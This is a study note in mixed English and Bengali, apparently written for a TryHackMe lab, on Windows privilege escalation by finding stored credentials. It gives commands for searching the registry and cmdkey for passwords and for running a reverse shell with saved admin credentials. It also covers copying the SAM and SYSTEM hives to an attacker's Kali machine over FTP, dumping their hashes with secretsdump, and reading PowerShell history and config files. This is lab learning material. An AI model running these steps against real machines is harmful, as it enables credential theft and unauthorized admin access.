# **WIndows Privilege Escalation via Credential Discovery**

## Try to find credentials from Registries

```
reg query HKLM /f password /t REG_SZ /s
```
* /f --> find, -t --> type = string ..It searches password in Local Machine. Here you may get the important credentials

```
reg query "HKLM\Software\Microsoft\Windows NT\Current Version\winlogon"
```
* winlogon is a important registry. We should check it out. We can get important credentials here.

```
reg query HKLM_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\
```
* output: HKLM_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP/23F42

```
reg query HKLM_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP/23F42
```
* Here you may get another user(admin) credentials who used his username and password for login via ssh or proxy server etc..


## Try to find credentials using cmdkey (Windows Credential Manager) 

cmdkey হলো Windows-এর একটি command-line tool, যা ব্যবহার করে Credential Manager-এ username ও password (credentials) save, view, delete করা যায়।

🔹 কী কাজ করে?

👉 বিভিন্ন service (RDP, network share ইত্যাদি) access করার জন্য credentials store করে
👉 বারবার password না দিয়ে auto login সম্ভব হয়

⚙️ Common Commands:
```
cmdkey /list        → সব saved credentials দেখায়
cmdkey /add         → নতুন credential যোগ করে
cmdkey /delete      → credential delete করে
```
👉 system-এ stored credentials দেখা যাবে
⚠️ Security:
* Stored credential misuse হলে unauthorized access হতে পারে
* attacker saved credential ব্যবহার করে lateral movement করতে পারে

💡 উদাহরণ:
```
cmdkey /list
```
* Shows the credentials . Here it may show admin username but is don't show it's pass. Because pass is encrypted . Suppose , Here admin credentials is saved, but pass is not shown . Now we can use some technique for privilege escalation. 

```
runas /savecred /user:admin cmd.exe
```
* runas--> like sudo, /savecred--> don't need pass.
* It run a new cmd as admin user

```
runas /savecred /user:admin reverse.exe
```
* Here we can also use reverse_shell which is created by msfvenom and netcal listener is open ..



## Try to find credentials using SAM & SYSTEM

🔹 SAM (Security Account Manager)

SAM হলো Windows-এর একটি database, যেখানে local user account ও password (hashed form) সংরক্ষিত থাকে।
📂 Location: C:\Windows\System32\config\SAMC:\Windows\System32\config\SAM

⚙️ কী থাকে:
* Usernames
* Password hashes
* Group information

⚠️ Security:
* Directly readable না (locked থাকে)
* কিন্তু dump করলে password hash পাওয়া যায়

🔹 SYSTEM

SYSTEM file হলো Registry hive, যেখানে system configuration ও encryption key থাকে।
📂 Location: C:\Windows\System32\config\SYSTEM

⚙️ কী কাজ:
* Boot configuration
* System settings
* SAM hash decrypt করার key (boot key) store করে

🔗 SAM + SYSTEM সম্পর্ক
👉 SAM-এ password hash encrypted থাকে
👉 SYSTEM file-এর key দিয়ে সেই hash decrypt করা যায়

⚠️ Security Risk:
* SAM + SYSTEM access পেলে attacker password hash extract করতে পারে
* এরপর password crack বা pass-the-hash attack সম্ভব

```
copy C:\Windows\System32\config\SAM
```
* checking if SAM file have read/copy permission for my user. Most probably you don't get the permission. But some times , admin/other user saved the SAM & SYSTEM file in another folder. If we check all the folder's info , we may get SAM & SYSTEM file. In this lab , we get this in "C:\Windows\Repair" folder
```
cd C:\Windows\Repair
copy SAM C:\Users\user
```
* checking it's read permission for my user.And I have the permission. And the SAM file is encrypted, SYSTEM file is used to decrypt it..

* Now try to transfer these two files in my kali linux using ftp server
```
kali: python3 -m pyftpdlib --write --port 21
```
* now from windows connect to kali using ftp
```
ftp kali_ip
```
* username: anonymous , password: ...... Connected as anonymous user.
```
binary
```
* for transter in binary mode
```
put SAM
put SYSTEM
```
* It upload the files and it will saved in my kali automatically

Now In my kali decrypt the Files
```
kali: impacket-secretsdump LOCAL -system SYSTEM -sam SAM
```
* Decrypt these files and here you may get some credentials but in hash form(pass)
* You can unhash using john the ripper and websites or you can directly use the hashes for login 





## Try to find credentials from History

ROOM LINK : [Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20)

==>For this room, Get the windows use **Remmina** . It's give a GUI for RDP (remote) login to windows

* In general, cmd is not store the command history . But powershell is store command history. Now  check powershell command history..

```
type C:\Users\your_user\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost-history.txt
```

* Powershell history is generated differently for different users.
* Here in history, you may get some important credentials.


## Try to find credentials from config files
* Important config files 

Unattend.xml হলো Windows setup-এর একটি configuration file, যা ব্যবহার করে automated (unattended) installation করা হয়—মানে user input ছাড়াই Windows install করা যায়।
📂 Location: C:\Windows\Panther\Unattend.xml

⚙️ কী থাকে এই ফাইলে:
* Administrator username
* Password (কখনও plain text বা encoded)
* Computer name
* Time zone, language settings
* Installation configuration

💡 কীভাবে কাজ করে:
👉 Windows install-এর সময় এই file read করে
👉 Automatically সব setup process complete করে

⚠️ Security Risk:
* এখানে sensitive info (username/password) থাকতে পারে
* Misconfigured হলে attacker credential পেতে পারে
* Privilege Escalation-এর জন্য useful হতে পারে

#### checking info of this Unattend.xml file
```
type C:\Windows\Panther\Unattend.xml
```

* Another important config file 

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\web.config হলো .NET Framework-এর একটি গুরুত্বপূর্ণ configuration file, যা ASP.NET web application বা .NET runtime settings নিয়ন্ত্রণ করে।
📂 Location: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\web.config  [version is changeable]

⚙️ কী কাজ করে:
* ASP.NET application settings কনফিগার করে
* Security, authentication ও authorization rules define করে
* Database connection settings রাখতে পারে
* Runtime behavior control করে

💡 কী থাকে:
* Connection strings (database info)
* App settings (key-value configuration)
* Security policies
* Module & handler configuration

⚠️ Security Risk:
* Sensitive data (DB credentials, API keys) থাকতে পারে
* Misconfiguration হলে information leakage হতে পারে
* Web application attack surface বাড়ায়

#### checking info of this web.config file
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\web.config
```
* Here have a chance to get database username and password.. 
